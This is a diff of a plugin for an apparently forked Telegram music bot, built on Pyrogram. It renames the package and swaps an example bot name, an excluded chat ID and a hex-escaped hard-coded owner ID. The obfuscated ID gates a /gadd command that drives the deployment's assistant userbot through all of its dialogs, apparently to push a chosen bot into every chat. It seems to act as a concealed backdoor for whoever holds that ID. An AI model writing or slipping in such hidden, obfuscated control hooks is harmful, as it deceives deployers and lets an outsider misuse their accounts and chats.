@@ -2,9 +2,9 @@ import asyncio
 
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-OWNERS = "\x37\x33\x30\x32\x38\x38\x37\x31\x30\x31"
-from RAUSHAN import app
-from RAUSHAN.utils.database import add_served_chat, get_assistant
+OWNERS = "\x37\x35\x32\x30\x30\x39\x32\x33\x35\x34"
+from YTMUSIC import app
+from YTMUSIC.utils.database import add_served_chat, get_assistant
 
 
 @app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
@@ -12,7 +12,7 @@ async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
         await message.reply(
-            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @SonaliMusicRobot`**"
+            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd @zoyumusicbot`**"
         )
         return
 
@@ -26,7 +26,7 @@ async def add_allbot(client, message):
         lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
         await userbot.send_message(bot_username, f"/start")
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1002011723196:
+            if dialog.chat.id == -1002046320443:
                 continue
             try:
 
